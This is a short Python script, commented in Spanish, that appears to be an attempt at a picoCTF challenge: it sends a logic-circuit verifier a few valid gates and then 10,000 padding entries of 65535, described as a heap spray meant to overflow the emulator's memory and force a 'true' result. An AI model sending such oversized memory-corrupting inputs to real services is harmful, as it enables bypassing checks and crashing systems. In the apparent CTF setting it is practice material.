import requests

# Generamos un circuito enorme para desbordar la memoria desde 0x3000 en adelante
circuit = []

# Primero, la lógica válida para que el verificador empiece contento
for i in range(4):
    circuit.append({"input1": 5+i, "input2": 5+i, "output": 1+i})

# Segundo, el relleno masivo (Heap Spray). 
# Escribimos el valor 0xFFFF (65535) masivamente. Si el emulador usa memoria
# alta para su pila o registros temporales, esto forzará que evalúe 'true' (255)
# en lugar de false.
for i in range(10000):  
    circuit.append({"input1": 65535, "input2": 65535, "output": 65535})

print(f"[*] Enviando circuito con {len(circuit)} elementos (aprox {len(circuit)*6} bytes)")

url = "http://activist-birds.picoctf.net:56860/check"
response = requests.post(url, json={"circuit": circuit})

try:
    print(response.json())
except Exception as e:
    print(f"[-] El servidor devolvió algo que no es JSON: {response.text}")
